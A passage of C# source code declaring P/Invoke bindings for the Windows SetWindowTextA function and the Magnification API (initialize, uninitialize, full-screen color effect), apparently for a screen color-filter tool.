    /// </summary>
    /// <param name="hwnd">Window handle</param>
    /// <param name="lp">Title</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool SetWindowTextA(IntPtr hwnd, string lp);
    
    /// <summary>
    /// Initializes magnification
    /// </summary>
    /// <returns>Success or not</returns>
    [DllImport("Magnification.dll", ExactSpelling = true, SetLastError = true)]
    public static extern bool MagInitialize();

    /// <summary>
    /// Uninitializes magnification
    /// </summary>
    /// <returns>Success or not</returns>
    [DllImport("Magnification.dll", ExactSpelling = true, SetLastError = true)]
    public static extern bool MagUninitialize();
    
    /// <summary>
    /// Color effect
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct ColorEffect
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 25)]
        public float[] transform;
    }

    /// <summary>
    /// Apply a color effect for the entire screen
    /// </summary>
    /// <param name="pEffect">Color effect</param>
    /// <returns>Success or not</returns>
    [DllImport("Magnification.dll", ExactSpelling = true, SetLastError = true)]
    public static extern bool MagSetFullscreenColorEffect(ref ColorEffect pEffect);
}